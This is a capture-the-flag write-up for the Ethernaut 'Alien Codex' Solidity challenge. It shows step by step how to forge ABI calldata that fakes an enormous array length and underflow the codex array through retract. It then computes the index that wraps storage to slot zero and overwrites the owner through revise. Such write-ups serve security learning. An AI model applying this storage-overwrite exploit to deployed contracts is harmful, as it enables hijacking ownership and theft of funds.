# Alien codex

The source for this contract is

```
pragma solidity ^0.4.24;

import 'zeppelin-solidity/contracts/ownership/Ownable.sol';

contract AlienCodex is Ownable {

  bool public contact;
  bytes32[] public codex;

  modifier contacted() {
    assert(contact);
    _;
  }

  function make_contact(bytes32[] _firstContactMessage) public {
    assert(_firstContactMessage.length > 2**200);
    contact = true;
  }

  function record(bytes32 _content) contacted public {
  	codex.push(_content);
  }

  function retract() contacted public {
    codex.length--;
  }

  function revise(uint i, bytes32 _content) contacted public {
    codex[i] = _content;
  }
}
```

The objective of this challenge is to set our address as the owner
of the contract.

We learned in the [Privacy](../Privacy/README.md) challenge that
variables are optimized when stored in the storage and to solve
this challenge we are going to try to modify the storage using
the `revise` function. So we can use the [script](index.js) to
check what is the state of the contract storage. If we check the
storage at `0x00` we can see

```
0x00000000000000000000000073048cec9010e92c298b016966bde1cc47299df5
```

This is the address of the owner, so the `owner` variable is stored
at `0x00`.

Because of the `contacted` modifier the only function that we can
use at this moment is `make_contact`. We need to send an array with
more than `2^200` elements in order to set the `contact` variable
to `true`. We can do this by sending an array of this size but
`2^200` is a really big number so it will take a lot of time to
forge an array like this. Luckly we can trick the evm to think
that we are actually sending a really big array using just a few
`bytes`. In order to do this we need to understand how method calls
are encoded. A good resource on this topic can be found
[here](https://medium.com/@hayeah/how-to-decipher-a-smart-contract-method-call-8ee980311603).

First of all we need the function selector for the `make_contact`
function. This can be calculated with

```
selector = first4bytes(keccak256("make_contact(bytes32[])"))
```

This wiill result in

```
selector = 0x1d3d4c0b
```

Then we need to understand how an array parameter is encoded

```
offset // 32 bytes that tells where the array start
length // 32 bytes representing the length of the array
content // The rest of the bytes represent the content of the array
```

So our array will look like this

```
0000000000000000000000000000000000000000000000000000000000000020 // The array data starts in the byte number 32
f000000000000000000000000000000000000000000000000000000000000000 // We set the length as a really big number
                                                                 // We ignore the content
```

Finaly we need to send a transaction with this data to the contract
to trick the `make_contact` function.

```
0x1d3d4c0b
0000000000000000000000000000000000000000000000000000000000000020
f000000000000000000000000000000000000000000000000000000000000000
```

Now if we call `contract.contact` in the browser console it
should return `true`. Because of this now we can use the rest
of the functions. We can check that it worked using the
[script](index.js). If we load the storage at `0x00` now we
are going to see this

```
0x00000000000000000000000173048cec9010e92c298b016966bde1cc47299df5
```

Notice that now there is a `01` just before the `owner` address,
this means that the `contact` variable is now `true`.

The `revise` function allow us to write data in the contract
storage but in order to do this we need to modify the `codex`
array length. To do this we can laverage the `retract` function.

The `retract` function decreases the length of the `codex` array
but it doesn't check for underflows. So, if the current lenght
is `0` calling the `retract` function will set the length to
`2^256 - 1`.

Now we can use the `revise` function to write arbitrary data
in the contract storage. To understand how dynamic arrays are
stored on the storage you can read [this](https://programtheblockchain.com/posts/2018/03/09/understanding-ethereum-smart-contract-storage/).
The `codex` array is located on the `0x01` slot of the storage.
This means that the content of the array will start at
`keccak256(uint256(1))` and it will be stored consecutively like
this

```
0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6 => codex[0]
0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf7 => codex[1]
0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf8 => codex[2]
...
0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff => codex[limit]
0x0000000000000000000000000000000000000000000000000000000000000000 => codex[limit + 1]
```

Notice that if we calculate the `limit` we can do an overflow on the
storage slots by accesing `code[limit + 1]` and because of this we can
modify the storage at `0x00` where the owner variable is stored.

Calculating the limit is easy

```
(2^256 - 1) - uint256(0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6)
```

This will result in

```
limit     = 0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f309
limit + 1 = 0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a
```

Now we just need to call the `revise` function like

```
contract.revise(
  // The index to do the overflow and write to 0x00
  "0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a",
  // Your address padded to 32 bytes
  "0x000000000000000000000000692a70d2e424a56d2c6c27aa97d1a86395877b3a"
)
```